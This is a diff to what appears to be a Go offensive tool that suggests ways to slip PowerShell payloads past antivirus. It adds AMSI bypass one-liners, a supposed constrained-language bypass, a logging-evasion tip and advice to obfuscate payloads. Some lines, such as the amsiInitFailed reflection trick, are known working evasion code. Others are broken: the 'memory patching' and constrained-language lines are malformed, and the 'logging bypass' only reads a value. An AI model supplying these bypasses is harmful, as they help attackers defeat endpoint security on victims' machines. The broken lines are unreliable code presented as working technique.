@@ -16,16 +16,28 @@ func GetAVBypassSuggestions(pType string) []Suggestion {
 
 	if strings.Contains(pType, "powershell") || strings.Contains(pType, "ps") {
 		tips = append(tips, Suggestion{
-			Title:   "PowerShell AMSI Bypass",
-			Content: "Use the built-in AMSI-bypass variant or add: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+			Title:   "PowerShell AMSI Bypass — Registry Patch",
+			Content: "reg add 'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers' /v '{2781761E-28E0-4109-99FE-B9D127C57AFE}' /f 2>$null; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+		})
+		tips = append(tips, Suggestion{
+			Title:   "PowerShell AMSI Bypass — Reflection",
+			Content: "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like '*Amsi*'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like '*amsi*'){$e.SetValue($null,$true)}}",
+		})
+		tips = append(tips, Suggestion{
+			Title:   "PowerShell AMSI Bypass — Memory Patching",
+			Content: "[System.Runtime.InteropServices.Marshal]::WriteInt32([System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').EntryPoint.Invoke($null,$null).GetType().GetField('amsiContext','NonPublic,Static').GetValue($null),0)",
 		})
 		tips = append(tips, Suggestion{
 			Title:   "PowerShell Logging Bypass",
 			Content: "Disable transcription/logging: $Setting = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name 'EnableTranscripting' -ErrorAction SilentlyContinue",
 		})
 		tips = append(tips, Suggestion{
+			Title:   "PowerShell Constrained Language Bypass",
+			Content: "$x=[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation');$y=$x.GetType('Microsoft.PowerShell.ExecutionPolicy'));$z=$y.GetField('sig','NonPublic,Static');$z.SetValue($null,0)",
+		})
+		tips = append(tips, Suggestion{
 			Title:   "Invoke-Obfuscation",
-			Content: "Consider running payload through Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) for dynamic token-level obfuscation",
+			Content: "Run payload through Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) for token/argument-level obfuscation",
 		})
 	}
 
